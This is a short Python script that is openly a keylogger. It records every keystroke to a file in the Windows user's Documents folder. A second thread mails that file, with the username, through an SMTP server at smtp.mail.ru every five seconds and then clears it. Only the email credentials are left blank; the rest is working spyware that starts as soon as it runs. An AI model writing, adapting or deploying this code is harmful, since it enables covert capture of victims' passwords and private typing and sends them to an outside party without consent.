from pynput.keyboard import Key, Listener
import logging
import smtplib
import getpass
global directory
directory = 'C:/Users/'+getpass.getuser()+'/Documents/key_log.txt'

def keyloging():
	global directory
	open(directory,'w+')
	logging.basicConfig(filename=(directory), level=logging.DEBUG, format='%(asctime)s: %(message)s')
	def on_press(key):
	   logging.info(str(key))
	with Listener(on_press=on_press) as listener:
	    listener.join()

def send_mail():
	email = ''
	password = ''
	interval = 5
	global directory
	import time
	while True:	
		file = open(directory, 'r')
		mail = smtplib.SMTP('smtp.mail.ru', 587)
		mail.ehlo()
		mail.starttls()
		mail.login(email, password)
		mail.sendmail(email, email, getpass.getuser()+"\n"+file.read())
		mail.close()
		file.close()
		file = open(directory, 'w')
		file.close()
		time.sleep(interval)

import threading
threading.Thread(target=send_mail).start()
threading.Thread(target=keyloging).start()